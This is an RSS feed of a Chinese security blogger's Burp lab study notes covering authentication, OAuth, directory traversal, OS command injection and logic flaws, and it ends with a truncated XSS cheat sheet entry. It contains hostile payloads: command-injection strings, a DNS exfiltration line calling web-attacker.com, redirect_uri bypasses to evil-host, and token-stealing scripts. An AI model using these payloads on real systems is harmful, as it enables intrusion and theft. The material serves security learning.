<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Vegetable Blog</title>
        <subtitle></subtitle>
        <icon>http://ericcd.com/images/favicon.ico</icon>
        <link>http://ericcd.com</link>
        <author>
          <name>EricCD</name>
        </author>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
        <lastBuildDate>Thu, 22 Dec 2022 20:44:54 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-2/</guid>
            <title>BurpLab_2-Authentication</title>
            <link>http://ericcd.com/2022/12/22/BurpLab-2/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;authentication-vulnerabilities&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#authentication-vulnerabilities&#34;&gt;#&lt;/a&gt; Authentication vulnerabilities&lt;/h1&gt;
&lt;h2 id=&#34;vulnerabilities-in-password-based-login&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-password-based-login&#34;&gt;#&lt;/a&gt; Vulnerabilities in password-based login&lt;/h2&gt;
&lt;h3 id=&#34;brute-force-attacks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#brute-force-attacks&#34;&gt;#&lt;/a&gt; Brute-force attacks&lt;/h3&gt;
&lt;h4 id=&#34;username-enumeration&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#username-enumeration&#34;&gt;#&lt;/a&gt; Username enumeration&lt;/h4&gt;
&lt;p&gt;1.Status codes&lt;br /&gt;
2.Error messages&lt;br /&gt;
3.Response times&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Forwarded-For 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。，用它伪装 IP 地址来绕过对暴力破解的限制。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;flawed-brute-force-protection&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flawed-brute-force-protection&#34;&gt;#&lt;/a&gt; Flawed brute-force protection&lt;/h3&gt;
&lt;p&gt;常见的暴力破解防护措施有两种：如果一个账号有太多的登录失败尝试，就封锁账号；封掉发起太多失败登录的 ip。&lt;br /&gt;
对于锁定 ip，有的后端可能会在一个 ip 地址登陆成功后重置计时器，因此可以通过间歇登录成功账号来重置计时器。&lt;/p&gt;
&lt;h4 id=&#34;account-locking&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#account-locking&#34;&gt;#&lt;/a&gt; Account locking&lt;/h4&gt;
&lt;p&gt;发现一个账号在发起一定次数的错误登陆后会被锁定，找到这个次数，然后以不超过这个次数的频率进行爆破。&lt;/p&gt;
&lt;h4 id=&#34;user-rate-limiting&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#user-rate-limiting&#34;&gt;#&lt;/a&gt; User rate limiting&lt;/h4&gt;
&lt;p&gt;发现账号密码以如下的 json 表格进行传输。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;username&amp;quot;:&amp;quot;123&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 将表格中的密码部分修改为数组形式，最后效果如下。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;username&amp;quot; : &amp;quot;carlos&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;password&amp;quot; : [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;123456&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;password&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;qwerty&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 发送请求，收到一个 302 的 response，选择讲此 response 在浏览器中显示，并讲 url 复制到浏览器中，成功登录账号。&lt;/p&gt;
&lt;h3 id=&#34;http-basic-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-basic-authentication&#34;&gt;#&lt;/a&gt; HTTP basic authentication&lt;/h3&gt;
&lt;p&gt;这种授权方式较少通过爆破绕过，可以试下 CSRF&lt;/p&gt;
&lt;h2 id=&#34;vulnerabilities-in-multi-factor-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-multi-factor-authentication&#34;&gt;#&lt;/a&gt; Vulnerabilities in multi-factor authentication&lt;/h2&gt;
&lt;h3 id=&#34;bypassing-two-factor-authentication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypassing-two-factor-authentication&#34;&gt;#&lt;/a&gt; Bypassing two-factor authentication&lt;/h3&gt;
&lt;p&gt;在有的 two-factor authentication 中，有的程序员由于疏忽，在第一次账户登录后就将用户标记为登录状态，而并非在第二次验证通过后才进行此操作，&lt;br /&gt;
因此我们可以在第一次账户登陆后，直接由 url 跳转到账户页面，从而绕过第二次验证。&lt;/p&gt;
&lt;h3 id=&#34;flawed-two-factor-verification-logic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flawed-two-factor-verification-logic&#34;&gt;#&lt;/a&gt; Flawed two-factor verification logic&lt;/h3&gt;
&lt;p&gt;在第二次验证时，由于使用 account 来判断进行验证的账号，因此可以先使用自己的账号密码登录，在第二次验证时修改协议中的 account 为目标账号，并对验证进行爆破。&lt;/p&gt;
&lt;h3 id=&#34;brute-forcing-2fa-verification-codes&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#brute-forcing-2fa-verification-codes&#34;&gt;#&lt;/a&gt; Brute-forcing 2FA verification codes&lt;/h3&gt;
&lt;p&gt;有的登录界面会在登陆时刷新验证码次数，所以可以使用 burp 脚本来重复登录 - 验证这一过程，达到爆破的目的。&lt;/p&gt;
&lt;h2 id=&#34;vulnerabilities-in-other-authentication-mechanisms&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-other-authentication-mechanisms&#34;&gt;#&lt;/a&gt; Vulnerabilities in other authentication mechanisms&lt;/h2&gt;
&lt;h3 id=&#34;keeping-users-logged-in&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#keeping-users-logged-in&#34;&gt;#&lt;/a&gt; Keeping users logged in&lt;/h3&gt;
&lt;p&gt;尝试下能否逆向 cookie 或窃取 cookie。&lt;/p&gt;
&lt;h3 id=&#34;resetting-user-passwords&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#resetting-user-passwords&#34;&gt;#&lt;/a&gt; Resetting user passwords&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;在请求修改密码的包中加入 x-forwarded-host 头指向自己的服务器，然后将账号信息设置为用户的信息，如果用户点击密码重置邮件的链接，其 token 就会转发到我们设置的服务器上去。&lt;/li&gt;
&lt;li&gt;爆破重置密码的包&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;oauth-20-authentication-vulnerabilities&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oauth-20-authentication-vulnerabilities&#34;&gt;#&lt;/a&gt; OAuth 2.0 authentication vulnerabilities&lt;/h2&gt;
&lt;h3 id=&#34;vulnerabilities-in-the-client-application&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-the-client-application&#34;&gt;#&lt;/a&gt; Vulnerabilities in the client application&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;没有使用 state 绑定导致攻击者可以通过 CSRF 将自己的邮箱绑定别人的账号。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;vulnerabilities-in-the-oauth-service&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vulnerabilities-in-the-oauth-service&#34;&gt;#&lt;/a&gt; Vulnerabilities in the OAuth service&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;使用 CSRF 获取他人 code，并用得到的 code 进行登录认证。&lt;br /&gt;
有的服务器会使用白名单来筛选 redirect_uri，可以尝试绕过。&lt;br /&gt;
针对黑名单，可以采取以下方法：a. 更换表述，比如用 2130706433, 017700000001, 或 127.1. 替换 127.0.0.1、b. 注册一个自己的域名来指向想要的 ip 地址、c。使用 URL 加密等技术混淆。&lt;br /&gt;
针对白名单匹配，可以采用以下方法：a. 使用 @符号在 hostname 前存放证书，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9leHBlY3RlZC1ob3N0OmZha2VwYXNzd29yZEBldmlsLWhvc3Q=&#34;&gt;https://expected-host:fakepassword@evil-host&lt;/span&gt;、b. 使用 #符号来表示 URL 片段，比如 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ldmlsLWhvc3QjZXhwZWN0ZWQtaG9zdCVFMyU4MCU4MWM=&#34;&gt;https://evil-host#expected-host、c&lt;/span&gt;. 根据 DNS 命名规则将指定的输入存放在自己控制的 DNS 名中、d. 使用 URL 加密混淆。&lt;br /&gt;
有时还可以利用开放重定向漏洞配合目录穿越漏洞来实现网页跳转。&lt;br /&gt;
有时更改其他标志，比如将 response_mode 改为 fragment 有时也能绕过筛查。&lt;/li&gt;
&lt;li&gt;一段 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!document.location.hash) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;URL&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;/?&amp;#x27;+document.location.hash.substr (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
3.otherWindow.postMessage (message, targetOrigin, [transfer]);&lt;br /&gt;
message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
以下脚本可以接收并传递传出来的信息。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    window.addEventListener (&amp;#x27;message&amp;#x27;, function (e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fetch (&amp;quot;/&amp;quot; + encodeURIComponent (e.data.data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, false)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
4.HTML injection vulnerabilities&lt;br /&gt;
 有的浏览器（比如火狐），在加载一些元素时（比如 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwtdXNlci5uZXQ=&#34;&gt;evil-user.net&lt;/span&gt;&amp;quot;&amp;gt;），会将整个 URL 放在 refer 头里，包括一些我们关心的查询字符串。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;openid-connect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openid-connect&#34;&gt;#&lt;/a&gt; OpenID Connect&lt;/h2&gt;
&lt;p&gt;考虑到 OpenID 是建立在 OAuth 上，许多前面提到的 OAuth 存在的问题 OpenID 也存在，接下来介绍以下由 OpenID 带来的新问题。&lt;br /&gt;
1.Unprotected dynamic client registration&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-3/</guid>
            <title>BurpLab_3-Directory_traversal</title>
            <link>http://ericcd.com/2022/12/22/BurpLab-3/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个简单特点&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
&lt;li&gt;爆破&lt;/li&gt;
&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-4/</guid>
            <title>BurpLab_4-OS_command_injection</title>
            <link>http://ericcd.com/2022/12/22/BurpLab-4/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;executing-arbitrary-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#executing-arbitrary-commands&#34;&gt;#&lt;/a&gt; Executing arbitrary commands&lt;/h1&gt;
&lt;p&gt;最基础的 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; echo aiwefwlguh &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1|whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2. 常用指令&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection by redirecting output&lt;/h1&gt;
&lt;p&gt;配合目录穿越使用&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; whoami &amp;gt; /var/www/static/whoami.txt &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection using out-of-band (OAST) techniques&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;ways-of-injecting-os-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ways-of-injecting-os-commands&#34;&gt;#&lt;/a&gt; Ways of injecting OS commands&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;仅 Unix 系统下使用的分隔符：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Newline (0x0a or \n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 还可以通过以下方式执行命令:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`injected command`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(injected command )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-5/</guid>
            <title>BurpLab_5-Business_logic_vulnerabilities</title>
            <link>http://ericcd.com/2022/12/22/BurpLab-5/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excessive-trust-in-client-side-controls&#34;&gt;#&lt;/a&gt; Excessive trust in client-side controls&lt;/h1&gt;
&lt;h1 id=&#34;failing-to-handle-unconventional-input&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#failing-to-handle-unconventional-input&#34;&gt;#&lt;/a&gt; Failing to handle unconventional input&lt;/h1&gt;
&lt;p&gt;1.Are there any limits that are imposed on the data?&lt;br /&gt;
2.What happens when you reach those limits?&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuSXM=&#34;&gt;3.Is&lt;/span&gt; any transformation or normalization being performed on your input?&lt;br /&gt;
4. 注意边界值和特殊值&lt;br /&gt;
 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/30/XSS-cheet-sheet/</guid>
            <title>XSS_cheet_sheet</title>
            <link>http://ericcd.com/2022/11/30/XSS-cheet-sheet/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Wed, 30 Nov 2022 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;payload 记录。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
1.tags&lt;br /&gt;
